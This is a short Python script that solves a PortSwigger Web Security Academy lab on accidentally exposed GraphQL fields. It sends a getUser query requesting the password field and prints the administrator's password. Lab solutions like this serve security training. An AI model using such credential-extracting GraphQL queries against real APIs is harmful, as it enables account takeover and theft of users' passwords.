#!/usr/bin/python3
#Lab: Accidental exposure of private GraphQL fields : https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure

import requests
import sys
import json

def req(url):
    json_payload = {
        "query":"""
            query {
        getUser(id: 1) {
            id
            password
            username
        }
    }"""
    }
    headers = {
        'Content-Type': 'application/json'
    }
    vuln_path = url+'/graphql/v1'
    r = requests.post(url=vuln_path, headers=headers, json=json_payload)
    data = r.json()
    blog_post = data.get('data', {}).get('getUser', {})
    if blog_post:
        print("Password for administrator : ",blog_post.get('password'))
    else:
        print("failed!")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("Exploiting...")
    req(url)


if __name__=='__main__':
    main()